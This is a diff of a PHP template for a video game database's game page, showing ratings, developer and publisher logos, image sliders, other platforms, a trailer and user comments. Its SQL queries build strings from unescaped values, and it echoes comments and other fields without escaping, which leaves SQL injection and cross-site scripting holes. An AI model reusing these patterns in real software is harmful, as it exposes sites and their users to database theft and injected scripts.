-			<?php
-			if(mysql_num_rows($result) > 0)
-			{
-			while ($banner = mysql_fetch_object($result)) {
-				echo "<li><br />";
-				$banner->language = "N/A";
-				$banner->subkey = $banner->resolution;
-
-				## If this person is allowed to delete the banner, pass that info along
-				if ($banner->userid == $user->id || $adminuserlevel == 'ADMINISTRATOR') {
-					displaybannernew($banner, 1, "");
+						<?php } ?>
+			</div>
+			<hr />
+			<p><?php if (!empty($game->Overview)) { echo $game->Overview; } else { echo "\"No overview is currently available for this title.\""; } ?></p>
+			<hr />
+			<div id="gameVitals">
+				<div id="esrbIcon" style ="float: right; width: 72px; height: 100px;">
+					<?php
+						switch($game->Rating)
+						{
+							case "EC - Early Childhood":
+								?>
+									<img src="<?= $baseurl ?>/images/game-view/esrb/esrb-ec.png" />
+								<?php
+							break;
+							
+							case "E - Everyone":
+								?>
+									<img src="<?= $baseurl ?>/images/game-view/esrb/esrb-everyone.png" />
+								<?php
+							break;
+							
+							case "E10+ - Everyone 10+":
+								?>
+									<img src="<?= $baseurl ?>/images/game-view/esrb/esrb-e10.png" />
+								<?php
+							break;
+							
+							case "T - Teen":
+								?>
+									<img src="<?= $baseurl ?>/images/game-view/esrb/esrb-teen.png" />
+								<?php
+							break;
+							
+							case "M - Mature":
+								?>
+									<img src="<?= $baseurl ?>/images/game-view/esrb/esrb-mature.png" />
+								<?php
+							break;
+							
+							case "RP - Rating Pending":
+								?>
+									<img src="<?= $baseurl ?>/images/game-view/esrb/esrb-rp.png" />
+								<?php
+							break;
+						}
+					?>
+				</div>
+				<p><span class="grey">Players:</span>&nbsp;&nbsp;<?php if (!empty($game->Players)) { echo $game->Players; } else { echo "N/A"; } ?>
+					<span class="grey" style="padding-left: 20px;">Co-op:</span>&nbsp;&nbsp;<?php if($game->coop != false) { echo $game->coop; } else { echo "N/A"; } ?><br />
+				<span class="grey">Genres:</span>&nbsp;&nbsp;<?php if (!empty($game->Genre)) { 
+					$genres = explode("|", $game->Genre);
+					$genreCount = 1; 
+					while($genreCount < count($genres) - 1)
+					{
+						echo $genres[$genreCount];
+						if ($genreCount < count($genres) - 2)
+						{
+							echo ", ";
+						}
+						$genreCount++;
+						}
+					}
+					else { echo "N/A"; } ?><br />
+				<span class="grey">Release Date:</span>&nbsp;&nbsp;<?php if (!empty($game->ReleaseDate)) { echo $game->ReleaseDate; } else { echo "N/A"; } ?><br /><br />
+				
+				<?php
+				// Start Developer Logo Replacement
+				if (!empty($game->Developer))
+				{ 
+					$developerBool = false;
+					$devArray = explode(" ", $game->Developer);
+					$i = 0;
+					
+					for($i = 0; $i < count($devArray); $i++)
+					{
+						$developerQuery = mysql_query(" SELECT logo FROM publishers WHERE keyword LIKE '%$devArray[$i]%' ");
+						if($developerQuery)
+						{
+							if(mysql_num_rows($developerQuery) != 0)
+							{
+								$developerResult = mysql_fetch_object($developerQuery);
+								$developerBool = true;
+								$i = count($devArray);
+							}
+						}
+					}
+					if($developerBool == true)
+					{
+						if(!file_exists("banners/_gameviewcache/publishers/$developerResult->logo"))
+						{
+							WideImage::load("banners/publishers/$developerResult->logo")->resize(400, 60)->saveToFile("banners/_gameviewcache/publishers/$developerResult->logo");
+						}
+					?>
+						<span class="grey">Developer:</span><br /><img src="<?= $baseurl; ?>/banners/_gameviewcache/publishers/<?= $developerResult->logo; ?>" alt="<?= $game->Developer; ?>" title="<?= $game->Developer; ?>" style="vertical-align: middle; padding-bottom: 14px; padding-top: 4px;" /><br />
+					<?php
+					}
+					else
+					{
+					?>
+						<span class="grey">Developer:</span>&nbsp;&nbsp;<?php if (!empty($game->Developer)) { echo $game->Developer; } else { echo "N/A"; } ?><br />
+					<?php
+					}
 				}
-				else {
-					displaybannernew($banner, 0, "");
+				else
+				{
+				?>
+					<span class="grey">Developer:</span>&nbsp;&nbsp;<?php if (!empty($game->Developer)) { echo $game->Developer; } else { echo "N/A"; } ?><br />
+				<?php
 				}
-
-				## Increment counter
-				$bannercount++;
-				echo "<br /></li>";
-			}
-			?>
-			<?php
-			}
-			if ($bannercount == 0) {
-				print "<li><p style=\"text-align: center;\">There is no front box art for this game</p></li>";
-			}
-			?>
-			</ul>
-			<?php	if ($loggedin == 1) {  ?>
-			<p style="text-align: center; padding-top: 10px;"><span style="background-color: #333; border: 1px solid #DDD; border-radius: 6px; padding: 10px;"><a href="#frontBoxartUpload" rel="facebox"><img src="images/common/icons/upload_24.png" style="border: 0px; vertical-align: -7px;" alt="Upload Artwork" /></a> <a href="#frontBoxartUpload" rel="facebox" style="font-size: 16px;">Upload Front Boxart</a></span></p>
-			<?php  }  ?>
-		</div>
-		<!-- End Front Boxart Panel -->
-		
-		
-		<!-- Start Rear Boxart Panel -->
-		<div class="miniPanel boxart">
-			<h2 class="arcade">Rear Box Art</h2>
+				?>
+				
+				<?php
+				// Start Publisher Logo Replacement
+				if (!empty($game->Publisher))
+				{
+					$publisherBool = false;
+					$pubArray = explode(" ", $game->Publisher);
+					$i = 0;
+					
+					for($i = 0; $i < count($pubArray); $i++)
+					{
+						$publisherQuery = mysql_query(" SELECT logo FROM publishers WHERE keyword LIKE '%$pubArray[$i]%' ");
+						if($publisherQuery)
+						{
+							if(mysql_num_rows($publisherQuery) != 0)
+							{
+								$publisherResult = mysql_fetch_object($publisherQuery);
+								$publisherBool = true;
+								$i = count($pubArray);
+							}
+						}
+					}
+					if($publisherBool == true)
+					{
+						if(!file_exists("banners/_gameviewcache/publishers/$publisherResult->logo"))
+						{
+							WideImage::load("banners/publishers/$publisherResult->logo")->resize(400, 60)->saveToFile("banners/_gameviewcache/publishers/$publisherResult->logo");
+						}
+					?>
+						<span class="grey">Publisher:</span><br /><img src="<?= $baseurl; ?>/banners/_gameviewcache/publishers/<?= $publisherResult->logo; ?>" alt="<?= $game->Publisher; ?>" title="<?= $game->Publisher; ?>" style="vertical-align: middle; padding-bottom: 14px; padding-top: 4px;" />
+					<?php
+					}
+					else
+					{
+					?>
+						<span class="grey">Publisher:</span>&nbsp;&nbsp;<?php if (!empty($game->Publisher)) { echo $game->Publisher; } else { echo "N/A"; } ?>
+					<?php
+					}
+				}
+				else
+				{
+				?>
+					<span class="grey">Publisher:</span>&nbsp;&nbsp;<?php if (!empty($game->Publisher)) { echo $game->Publisher; } else { echo "N/A"; } ?>
+				<?php
+				}
+				?>
+				
+				</p>
+				<div style="clear: both;"></div>
+			</div>
+			<?php if($game->Platform == 1 || $game->Platform == 37) { ?>
+			<hr />
+				<div id="sysReq">
+					<p><span class="grey">System Requirements</span></p>
+					<p><span class="grey">OS:</span> <?php if($game->os == ""){echo "N/A";} else{echo $game->os;} ?><br />
+					<span class="grey">Processor:</span> <?php if($game->processor == ""){echo "N/A";} else{echo $game->processor;} ?><br />
+					<span class="grey">RAM:</span> <?php if($game->ram == ""){echo "N/A";} else{echo $game->ram;} ?><br />
+					<span class="grey">Hard Drive:</span> <?php if($game->hdd == ""){echo "N/A";} else{echo $game->hdd;} ?><br />
+					<span class="grey">Video:</span> <?php if($game->video == ""){echo "N/A";} else{echo $game->video;} ?><br />
+					<span class="grey">Sound:</span> <?php if($game->sound == ""){echo "N/A";} else{echo $game->sound;} ?></p>
+				</div>
+			<? } ?>
 			
-			<?php	## Display all fanart for this show
-			$bannercount = 0;
-			$query	= "SELECT *, (SELECT username FROM users WHERE id=banners.userid) AS creator, (SELECT AVG(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS rating, (SELECT COUNT(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS ratingcount FROM banners WHERE keytype='boxart' AND keyvalue=$id AND filename LIKE '%back%' ORDER BY rating DESC,RAND()";
-			$result = mysql_query($query) or die('Query failed: ' . mysql_error());
-			?>
-			<ul class="boxartSlide">
-			<?
-			if(mysql_num_rows($result) > 0)
-			{
-				while ($banner = mysql_fetch_object($result)) {
-					echo "<li><br />";
-					$banner->language = "N/A";
-					$banner->subkey = $banner->resolution;
+		</div>
+		<div style="clear:both"></div>
+	</div>
+	
+	<div id="gameContent">
+		<div id="gameContentTop">
+		
+			<div id="panelNav">
+				<ul>
+					<li><a id="nav_fanartScreens" class="active" href="#gameContentTop" onclick="contentShow('fanartScreens');">Fanart &amp; Screenshots</a></li>
+					<li><a id="nav_banners" href="#gameContentTop" onclick="contentShow('banners');">Banners</a></li>
+					<li><a id="nav_platforms" href="#gameContentTop" onclick="contentShow('platforms');">Other Platforms</a></li>
+					<li><a id="nav_trailer" href="#gameContentTop" onclick="contentShow('trailer');">Game Trailer</a></li>
+				</ul>
+				<div style="clear: both;"></div>
+			</div>
+			
+			<div style="clear: both;"></div>
+			
+			<hr />
+			
+			<div id="fanartScreens">
+				
+				<div id="fanart">
+				
+					<div class="slider-wrapper theme-default">
+						<div id="fanartRibbon" style="position: absolute; width: 125px; height: 125px; background: url(<?= $baseurl ?>/images/game-view/ribbon-fanart.png) no-repeat; z-index: 10"></div>
+						<?php
+						if ($fanartResult = mysql_query(" SELECT b.filename FROM banners as b WHERE b.keyvalue = '$game->id' AND b.keytype = 'fanart' "))
+						{
+							$fanSlideCount = 0;
+							if(mysql_num_rows($fanartResult) > 0)
+							{
+							?>
+								<div id="fanartSlider" class="nivoSlider">
+							<?php
+								while($fanart = mysql_fetch_object($fanartResult))
+								{	
+									// $dims = getimagesize("$baseurl/banners/$fanart->filename"); echo "$dims[0] x $dims[1]"; 
+							?>
+									<img  class="fanartSlide imgShadow" <?=imageResize("$baseurl/banners/$fanart->filename", "banners/_gameviewcache/$fanart->filename", 470, "width")?> alt="<?php echo $game->GameTitle; ?> Fanart" title="<a href='<?="$baseurl/banners/$fanart->filename"?>' target='_blank'>View Full-Size</a> | <a href='game-fanart-slideshow.php?id=<?=$game->id?>' target='_blank'>Full-screen Slideshow</a>" />
+							<?php
+									$fanSlideCount++;
+								}
+							?>
+								</div>
+							<?php
+							}
+							else
+							{
+								?>
+								<img class="imgShadow" src="<?php echo $baseurl; ?>/images/common/placeholders/fanart_blank.png" width="470" height="264" alt="<?php echo $game->GameTitle; ?>" title="<?php echo $game->GameTitle; ?>" />
+								<?php
+							}
+						}
+						?>	
+					</div>
+					
+				</div>
+				
+				<div id="screens">
+					
+					<div class="slider-wrapper theme-default">
+						<div id="screensRibbon" style="position: absolute; width: 125px; height: 125px; background: url(<?= $baseurl ?>/images/game-view/ribbon-screens.png) no-repeat; z-index: 10"></div>
+						<?php
+						if ($screenResult = mysql_query(" SELECT b.filename FROM banners as b WHERE b.keyvalue = '$game->id' AND b.keytype = 'screenshot' "))
+						{
+							if(mysql_num_rows($screenResult) > 0)
+							{
+							?>
+							<div id="screenSlider" class="nivoSlider">
+							<?php
+								$screenSlideCount = 0;
+								while($screen = mysql_fetch_object($screenResult))
+								{	
+							?>
+									<img  class="screenSlide" <?=imageDualResize("$baseurl/banners/$screen->filename", "banners/_gameviewcache/$screen->filename", 470, 264)?> alt="<?php echo $game->GameTitle; ?> Screenshot" title="<a href='<?="$baseurl/banners/$screen->filename"?>' target='_blank'>View Full-Size</a>" />
+							<?php
+									$screenSlideCount++;
+								}
+							?>
+							</div>
+							<?php
+							}
+							else
+							{
+								?>
+									<img class="imgShadow" src="<?php echo $baseurl; ?>/images/common/placeholders/fanart_blank.png" width="470" height="264" alt="<?php echo $game->GameTitle; ?>" title="<?php echo $game->GameTitle; ?>" />
+								<?php
+							}
+						}
+						?>	
+					</div>
+				</div>
 
-					## If this person is allowed to delete the banner, pass that info along
-					if ($banner->userid == $user->id || $adminuserlevel == 'ADMINISTRATOR') {
-						displaybannernew($banner, 1, "");
+				<div style="clear: both;"></div>
+
+			</div>
+			
+			<div id="banners">
+				<div class="slider-wrapper theme-default">
+					<div id="bannerRibbon" style="display: none; position: absolute; width: 125px; height: 125px; background: url(<?= $baseurl ?>/images/game-view/ribbon-banners.png) no-repeat; z-index: 10"></div>
+					<?php
+					if ($bannerResult = mysql_query(" SELECT b.filename FROM banners as b WHERE b.keyvalue = '$game->id' AND b.keytype = 'series' ") or die ("banner query failed" . mysql_error()))
+					{
+						if(mysql_num_rows($bannerResult) > 0)
+						{
+						?>
+							<div id="bannerSlider" class="nivoSlider" style="width:760px important; height: 140px !important;">
+						<?php
+							$bannerSlideCount = 0;
+							while($banner = mysql_fetch_array($bannerResult))
+							{	
+						?>
+								<img class="bannerSlide" src="<?="$baseurl/banners/$banner[filename]"?>" width="760" height="140" alt="<?php echo $game->GameTitle; ?> Banner" />
+						<?php
+								$bannerSlideCount++;
+							}
+						?>
+							</div>
+						<?php
+						}
+						else
+						{
+						?>
+							<img class="imgShadow" src="<?php echo $baseurl; ?>/images/common/placeholders/banner_blank.png" width="760" height="140" alt="<?php echo $game->GameTitle; ?>" title="<?php echo $game->GameTitle; ?>" />
+						<?php
+						}
 					}
-					else {
-						displaybannernew($banner, 0, "");
-					}
-				
-				}
-				## Increment counter
-				$bannercount++;
-				echo "<br /></li>";
-			}
-			?>
-			<?php
-			if ($bannercount == 0) {
-				print "<li><p style=\"text-align: center;\">There is no rear boxart for this game</p></li>";
-			}
-			?>
-			</ul>
-			<?php	if ($loggedin == 1) {  ?>
-			<p style="text-align: center; padding-top: 10px;"><span style="background-color: #333; border: 1px solid #DDD; border-radius: 6px; padding: 10px;"><a href="#rearBoxartUpload" rel="facebox"><img src="images/common/icons/upload_24.png" style="border: 0px; vertical-align: -7px;" alt="Upload Artwork" /></a> <a href="#rearBoxartUpload" rel="facebox" style="font-size: 16px;">Upload Rear Boxart</a></span></p>
-			<?php  }  ?>
-		</div>
-		<!-- End Rear Boxart Panel -->
-
+					?>	
+				</div>
+			
+				<div style="clear: both;"></div>
+			
+			</div>
 		
-		<!-- Start Fanart Panel -->
-		<div class="miniPanel fanart">
-			<h2 class="arcade">Fan Art</h2>
-			<?php	## Display all fanart for this show
-			$bannercount = 0;
-			$query	= "SELECT *, (SELECT username FROM users WHERE id=banners.userid) AS creator, (SELECT AVG(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS rating, (SELECT COUNT(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS ratingcount FROM banners WHERE keytype='fanart' AND keyvalue=$id ORDER BY rating DESC,RAND()";
-			$result = mysql_query($query) or die('Query failed: ' . mysql_error());
-			?>
-			<ul class="fanartSlide">
-			<?php
-			if(mysql_num_rows($result) > 0)
+			<div id="platforms">
+				<div style="margin: auto; width: 500px; box-shadow: 0px 0px 22px #000; border-radius: 16px; background-color: #1e1e1e; text-align: center; margin-top: 20px;">
+					<div style="padding: 20px;">
+						<h3 style="color: #fff;">Other Platforms with this Game</h3>
+						<?php
+							$similarResult = mysql_query(" SELECT g.id, g.platform, g.GameTitle, p.name, p.icon FROM games as g, platforms as p WHERE g.GameTitle = \"$game->GameTitle\" AND g.Platform <> '$game->Platform' AND g.Platform = p.id ORDER BY p.name");
+							$similarRowCount = mysql_num_rows($similarResult);
+							if($similarRowCount > 0)
+							{
+								?>
+								<p>This game exists on <?=$similarRowCount?> other platforms.</p>
+								<?php
+								while($similarRow = mysql_fetch_assoc($similarResult))
+								{
+									?>
+										<div style="margin-top: 10px; font-size: 16px;"><img src="<?=$baseurl?>/images/common/consoles/png32/<?=$similarRow['icon']?>" alt="<?=$similarRow['name']?>" style="vertical-align: -8px;" />&nbsp;&nbsp;<a href="<?=$baseurl?>?tab=game&id=<?=$similarRow['id']?>"><?=$similarRow['name']?> - <?=$similarRow['GameTitle']?></a></div>
+									<?php
+								}
+								?>
+								<p>If you know this game exists on another platform, why not <a href="<?=$baseurl?>?tab=addgame&passTitle=<?=urlencode($game->GameTitle)?>">add it</a>.</p>
+								<?php
+							}
+							else
+							{
+								?>
+								<p>There are currently no other platforms that have this game yet...</p>
+								<p>If you know of one, why not <a href="<?=$baseurl?>?tab=addgame&passTitle=<?=urlencode($game->GameTitle)?>">add it</a>.</p>
+								<?php
+							}
+						?>
+					</div>
+				</div>
+				<div style="clear: both;"></div>
+			</div>
+			
+			<div id="trailer">
+				<?php if ($game->Youtube != "") { ?>
+				<div style="margin: auto; width: 853px; box-shadow: 0px 0px 22px #000;">
+					<iframe width="853" height="510" src="http://www.youtube.com/embed/<?=str_replace("&hd=1", "", str_replace("?hd=1", "", "$game->Youtube")) . "?hd=1"?>" frameborder="0" allowfullscreen></iframe>
+					<div style="clear: both;"></div>
+				</div>
+				<?php } else { ?>
+				<div style="margin: auto; width: 500px; box-shadow: 0px 0px 22px #000; border-radius: 16px; background-color: #1e1e1e;">
+					<p style="color: #fff; font-size: 18px; text-shadow: 0px 0px 5px #000; text-align: center; padding: 125px 10px;">This game does not currently have a trailer added.</p>
+				</div>
+				<?php } ?>
+			</div>
+		
+		</div>
+		
+		<div style="clear: both;"></div>
+		
+		<div id="gameContentBottom">
+
+			<div style="text-align: center;"><a style="font-size: 18px; color: #fff; text-decoration: none; text-shadow: 0px 0px 10px #000;" href="#gameContentBottom"  onclick="$('#comments').slideToggle();">Comments&nbsp;&nbsp;<img style="vertical-align: middle;" src="<?= $baseurl; ?>/images/common/icons/collapse-alt_16.png" alt="Show Comments" title="Show Comments" /></a></div>
+			
+			<hr style="margin: 10px 0px 14px 0px;" />
+
+			<div id="comments" style="display: none;">
+					<?php
+						$commentsQuery = mysql_query(" SELECT c.*, u.username FROM comments AS c , users AS u WHERE c.gameid='$game->id' AND c.userid = u.id ORDER BY c.timestamp ASC");
+						if(mysql_num_rows($commentsQuery))
+						{
+							while($comments = mysql_fetch_object($commentsQuery))
+							{
+					?>
+								<div class="comment">
+								<?php
+								$filename = glob("banners/users/" . $comments->userid . "-*.jpg");
+								if(file_exists($filename[0]))
+								{
+								?>
+									<div style="float: left; width: 64px; height: 64px; padding: 0px 15px 15px 0px; text-align: center;"><img src="<?= $baseurl; ?>/<?= $filename[0]; ?>" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" /></div>
+								<?php
+									$filename = null;
+								}
+								else
+								{
+								?>
+									<img style="float: left; padding: 0px 15px 5px 0px;" src="<?=$baseurl; ?>/images/common/icons/user-black_64.png" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" />
+								<?php
+								}
+								?>
+									<span style="float: right;"><?= date("l, jS F Y - g:i A (T)", strtotime($comments->timestamp)) ?></span>
+									<h2><?= $comments->username; ?> says...</h2>
+									<p><?= $comments->comment; ?></p>
+									<?php
+										if($comments->userid == $user->id || $adminuserlevel == 'ADMINISTRATOR')
+										{
+									?>
+											<p style="text-align: right;"><a href="<?= $baseurl; ?>/game/<?= $game->id; ?>/?function=Delete+Game+Comment&commentid=<?= $comments->id; ?>">Delete Comment</a></p>
+									<?php
+										}
+									?>
+									<div style="clear: both;"></div>
+								</div>
+					<?php
+							}
+							if($loggedin == 1)
+							{
+					?>
+							<div class="comment">
+								<?php
+								$filename = glob("banners/users/" . $comments->userid . "-*.jpg");
+								if(file_exists($filename[0]))
+								{
+								?>
+									<div style="float: left; width: 64px; height: 64px; padding: 0px 15px 15px 0px; text-align: center;"><img src="<?= $baseurl; ?>/<?= $filename[0]; ?>" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" /></div>
+								<?php
+									$filename = null;
+								}
+								else
+								{
+								?>
+									<img style="float: left; padding: 0px 15px 5px 0px;" src="<?=$baseurl; ?>/images/common/icons/user-black_64.png" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" />
+								<?php
+								}
+								?>
+								<h2>Leave a comment...</h2>
+								<p>Comments are plain-text only: bb-code, html and so forth are not allowed.</p>
+								<form method="post" action="<?= $baseurl; ?>/game/<?= $game->id; ?>/">
+									<textarea name="comment" style="width: 100%; height: 60px;"></textarea>
+									<input type="hidden" name="userid" value="<?= $user->id; ?>" />
+									<input type="hidden" name="gameid" value="<?= $game->id; ?>" />
+									<input type="hidden" name="function" value="Add Game Comment" />
+									<p style="text-align: right;"><input type="submit" name="button" value="Leave Comment..." /></p>
+								</form>
+								<div style="clear: both;"></div>
+							</div>
+					<?php
+							}
+							else
+							{
+					?>
+							<div class="comment">
+								<?php
+								$filename = glob("banners/users/" . $comments->userid . "-*.jpg");
+								if(file_exists($filename[0]))
+								{
+								?>
+									<div style="float: left; width: 64px; height: 64px; padding: 0px 15px 15px 0px; text-align: center;"><img src="<?= $baseurl; ?>/<?= $filename[0]; ?>" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" /></div>
+								<?php
+									$filename = null;
+								}
+								else
+								{
+								?>
+									<img style="float: left; padding: 0px 15px 5px 0px;" src="<?=$baseurl; ?>/images/common/icons/user-black_64.png" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" />
+								<?php
+								}
+								?>
+									<h2>Leave a comment...</h2>
+									<p>Comments are plain-text only: bb-code, html and so forth are not allowed.</p>
+									<div style="clear: both;"></div>
+									<p style="font-size: 14px; text-align: center"><em>You must be logged in to leave a comment,<br />click <a href="<?= $baseurl; ?>/login/">here</a> to log in...</em></p>
+									<div style="clear: both;"></div>
+								</div>
+					<?php
+							}
+						}
+						else
+						{
+					?>
+							<div class="comment">
+								<?php
+								$filename = glob("banners/users/" . $comments->userid . "-*.jpg");
+								if(file_exists($filename[0]))
+								{
+								?>
+									<div style="float: left; width: 64px; height: 64px; padding: 0px 15px 15px 0px; text-align: center;"><img src="<?= $baseurl; ?>/<?= $filename[0]; ?>" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" /></div>
+								<?php
+									$filename = null;
+								}
+								else
+								{
+								?>
+									<img style="float: left; padding: 0px 15px 5px 0px;" src="<?=$baseurl; ?>/images/common/icons/user-black_64.png" alt="<?= $comments->username; ?>" title="<?= $comments->username; ?>" />
+								<?php
+								}
+								?>
+								<h2>No one has left a comment yet...</h2>
+								<p>Be the first to leave a comment!</p>
+								<?php
+									if ($loggedin == 1)
+									{
+								?>
+										<p>Comments are plain-text only: bb-code, html and so forth are not allowed.</p>
+										<form method="post" action="<?= $baseurl; ?>/game/<?= $game->id; ?>/">
+											<textarea name="comment" style="width: 100%; height: 60px;"></textarea>
+											<input type="hidden" name="userid" value="<?= $user->id; ?>" />
+											<input type="hidden" name="gameid" value="<?= $game->id; ?>" />
+											<input type="hidden" name="function" value="Add Game Comment" />
+											<p style="text-align: right;"><input type="submit" name="button" value="Leave Comment..." /></p>
+										</form>
+								<?php
+									}
+									else
+									{
+									?>
+										<div style="clear: both;"></div>
+										<p style="font-size: 14px; text-align: center"><em>You must be logged in to leave a comment,<br />click <a href="<?= $baseurl; ?>/login/">here</a> to log in...</em></p>
+									<?php
+									}
+								?>
+								<div style="clear: both;"></div>
+							</div>
+					<?php
+						}
+					?>
+				<div style="width: 96%; margin: auto; background: #333; box-shadow: 0px 0px 22px #000; border-radius: 16px; text-align: center;">
+				</div>
+				<div style="clear: both;"></div>
+			</div>
+			
+		</div>
+		
+		<!--
+		<div id="gameFooter">
+		
+		</div>
+		-->
+
+	</div>
+
+<!-- Start #panelNav Scripts -->
+<script type="text/javascript">
+	function contentShow(id)
+	{
+		switch (id)
+		{
+			case "fanartScreens":
+				contentHide();
+				$("#nav_fanartScreens").addClass("active");
+				$("#fanartScreens").slideDown("400");
+				$("#fanartRibbon").slideDown("400");
+				$("#screensRibbon").slideDown("400");
+			break;
+			
+			case "banners":
+				contentHide();
+				$("#nav_banners").addClass("active");
+				$("#banners").slideDown("400");
+				$("#bannerRibbon").slideDown("400");
+			break;
+			
+			case "platforms":
+				contentHide();
+				$("#nav_platforms").addClass("active");
+				$("#platforms").slideDown("400");
+			break;
+			
+			case "trailer":
+				contentHide();
+				$("#nav_trailer").addClass("active");
+				$("#trailer").slideDown("400");
+			break;
+		}
+	}
+	
+	function contentHide(id)
+	{
+		// Remove active class from nav item
+		$("#panelNav ul li a").each( function(index) { $(this).removeClass("active"); } );
+		
+		// Hide all panels
+		$("#fanartScreens").slideUp("400");
+		$("#fanartRibbon").slideUp("400");
+		$("#screensRibbon").slideUp("400");
+		$("#banners").slideUp("400");
+		$("#bannerRibbon").slideUp("400");
+		$("#platforms").slideUp("400");
+		$("#trailer").slideUp("400");
+	}
+</script>
+<!-- End #panelNav Scripts -->
+	
+	
+	
+<!-- Start Boxart Flip Script -->
+<script type="text/javascript">
+	$('#frontCover').css({display: "none"});
+	
+	$(document).ready(function(){
+		$('#frontCover').fadeIn(2000);
+	});	
+</script>
+
+<?php
+	if (!empty($back))
+	{
+?>
+<script type="text/javascript">
+	$('#gameCovers').css({cursor : "pointer"});
+
+	$(document).ready(function(){		
+		$('.gameCoversFlip').bind("click",function(){		 
+			var elem = $('#gameCovers');
+			 
+			if(elem.data('flipped'))
 			{
-			while ($banner = mysql_fetch_object($result)) {
-				
-				echo"<li><br />";
-				
-				$banner->language = "N/A";
-				$banner->subkey = $banner->resolution;
-
-				## If this person is allowed to delete the banner, pass that info along
-				if ($banner->userid == $user->id || $adminuserlevel == 'ADMINISTRATOR') {
-					displaybannernew($banner, 1, "");
-				}
-				else {
-					displaybannernew($banner, 0, "");
-				}
-
-				## Increment counter
-				$bannercount++;
-				
-				echo "<br /></li>";
+				elem.revertFlip();
+				elem.data('flipped',false)
 			}
-			?>
-			<?php
-			}
-
-			if ($bannercount == 0) {
-				print "<li><p style=\"text-align: center;\">There is no fan art for this game</p></li>";
-			}
-			?>
-			</ul>
-			<?php	if ($loggedin == 1) {  ?>
-			<p style="text-align: center; padding-top: 10px;"><span style="background-color: #333; border: 1px solid #DDD; border-radius: 6px; padding: 10px;"><a href="#fanartUpload" rel="facebox"><img src="images/common/icons/upload_24.png" style="border: 0px; vertical-align: -7px;" alt="Upload Artwork" /></a> <a href="#fanartUpload" rel="facebox" style="font-size: 16px;">Upload Fanart</a></span></p>
-			<?php  }  ?>
-		</div>
-		<!-- End Fanart Panel -->
-		
-		<!-- Start Screenshots Panel -->
-		<div class="miniPanel screenshots">
-			<h2 class="arcade">Screenshots</h2>
-			<?php	## Display all fanart for this show
-			$screenshotcount = 0;
-			$query	= "SELECT *, (SELECT username FROM users WHERE id=banners.userid) AS creator, (SELECT AVG(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS rating, (SELECT COUNT(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS ratingcount FROM banners WHERE keytype='screenshot' AND keyvalue=$id ORDER BY rating DESC,RAND()";
-			$result = mysql_query($query) or die('Query failed: ' . mysql_error());
-			?>
-			<ul class="screenshotsSlide">
-			<?php
-			if(mysql_num_rows($result) > 0)
+			else
 			{
-			while ($banner = mysql_fetch_object($result)) {
-				
-				echo"<li><br />";
-				
-				$banner->language = "N/A";
-				$banner->subkey = $banner->resolution;
-
-				## If this person is allowed to delete the banner, pass that info along
-				if ($banner->userid == $user->id || $adminuserlevel == 'ADMINISTRATOR') {
-					displaybannernew($banner, 1, "");
-				}
-				else {
-					displaybannernew($banner, 0, "");
-				}
-
-				## Increment counter
-				$screenshotcount++;
-				
-				echo "<br /></li>";
+				var frontWidth = $("#frontCover").attr("width");
+				var frontHeight = $("#frontCover").attr("height");
+				elem.flip({
+				direction:'rl',
+				speed: 350,
+				color: "#ff9000",
+				content: "<img class=\"imgShadow\" src=\"" + $("#backCover").attr("src") + "\" width=\"" + frontWidth + "\" height=\"" + frontHeight + "\" />"
+				});
+				elem.data('flipped',true);
 			}
-			?>
-			<?php
-			}
-
-			if ($screenshotcount == 0) {
-				print "<li><p style=\"text-align: center;\">There are no screenshots for this game</p></li>";
-			}
-			?>
-			</ul>
-			<?php	if ($loggedin == 1) {  ?>
-			<p style="text-align: center; padding-top: 10px;"><span style="background-color: #333; border: 1px solid #DDD; border-radius: 6px; padding: 10px;"><a href="#screenshotUpload" rel="facebox"><img src="images/common/icons/upload_24.png" style="border: 0px; vertical-align: -7px;" alt="Upload Screenshot" /></a> <a href="#screenshotUpload" rel="facebox" style="font-size: 16px;">Upload Screenshot</a></span></p>
-			<?php  }  ?>
-		</div>
-		<!-- End Screenshots Panel -->
-		
-		<!-- Start Banner Panel -->
-		 <div class="miniPanel banner">
-			<h2 class="arcade">Banners</h2>
-			<?php	## Display all banners for this show
-			$bannercount = 0;
-			$query	= "SELECT *, (SELECT username FROM users WHERE id=banners.userid) AS creator, (SELECT name FROM languages WHERE id=banners.languageid) AS language, (SELECT AVG(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS rating, (SELECT COUNT(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS ratingcount FROM banners WHERE keytype='series' AND keyvalue=$id ORDER BY rating DESC,RAND()";
-			$result = mysql_query($query) or die('Query failed: ' . mysql_error());
-			?>
-			<ul class="bannerSlide">
-			<?php
-			if(mysql_num_rows($result) > 0)
+		});	
+		$('#gameCovers').bind("click",function(){		 
+			var elem = $(this);
+			 
+			if(elem.data('flipped'))
 			{
-			while ($banner = mysql_fetch_object($result)) {
-				echo "<li><br />";
-				## If this person is allowed to delete the banner, pass that info along
-				if ($banner->userid == $user->id || $adminuserlevel == 'ADMINISTRATOR') {
-					displaybannernew($banner, 1, "");
-				}
-				else {
-					displaybannernew($banner, 0, "");
-				}
-
-				## Increment counter
-				$bannercount++;
-				echo "<br /></li>";
+				elem.revertFlip();
+				elem.data('flipped',false)
 			}
-			?>
-			<?php
+			else
+			{
+				var frontWidth = $("#frontCover").attr("width");
+				var frontHeight = $("#frontCover").attr("height");
+				elem.flip({
+				direction:'rl',
+				speed: 350,
+				color: "#ff9000",
+				content: "<img class=\"imgShadow\" src=\"" + $("#backCover").attr("src") + "\" width=\"" + frontWidth + "\" height=\"" + frontHeight + "\" />"
+				});
+				elem.data('flipped',true);
 			}
+		});	
+	});
+</script>
+<!-- End Boxart Flip Script -->
+<?php
+	}
+?>
 
-			if ($bannercount == 0) {
-				print "<li><p style=\"text-align: center;\">There are no banners for this game</p></li>";
-			}
-			?>
-			</ul>
